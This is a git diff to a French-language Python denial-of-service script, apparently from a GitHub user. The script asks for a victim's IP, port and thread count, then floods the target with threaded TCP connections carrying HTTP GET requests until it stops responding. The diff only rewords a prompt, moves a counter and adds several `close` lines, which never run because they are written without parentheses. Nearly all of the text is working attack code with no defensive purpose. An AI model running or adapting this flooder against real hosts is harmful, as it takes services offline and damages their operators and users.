@@ -25,10 +25,10 @@ print('\033[95m' + "By @tensh1hx | https://github.com/tensh1hx | You can modify 
 print("")
 print("")
 
-target = input('\033[92m' + "[?] Entrez l'IP de la victime: ")
+target = input('\033[92m' + "[?] Entrez l'IP à target: ")
 port = input('\033[92m' + "[?] Entrez un port: ")
 threads = input('\033[92m' + "[?] Entrez le nombre de threads à amorcer (342 par exemple): ")
-compteur = 0
+compteur = 1
 banned = 0
 
 if threads == '':
@@ -40,22 +40,25 @@ if port == '':
 port = int(port)
 threads = int(threads)
 
+
 def attaque():
     while True:
         try:
+            global compteur
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((target, port))
             request = "GET / HTTP/1.1\r\nHost:%s\r\n\r\n" % target
             request = request.encode()
             s.sendto(request, (target, port))
 
-            global compteur
+            compteur += 1
+
             print('\033[92m' + "[✓] {} requêtes envoyées avec succès à {}".format(compteur, target))
 
-            compteur += 1
             s.close
         except socket.error:
             print('\033[91m' + "[!] Connexion impossible! L'IP spécifiée ne répond plus.")
+            socket.close
             break
 
 for i in range(threads):
@@ -69,4 +72,5 @@ while True:
     except KeyboardInterrupt:
         print('\033[91m' + "\n[*] Vous avez décidé d'arrêter l'attaque.")
         print("")
+        socket.close
         sys.exit()
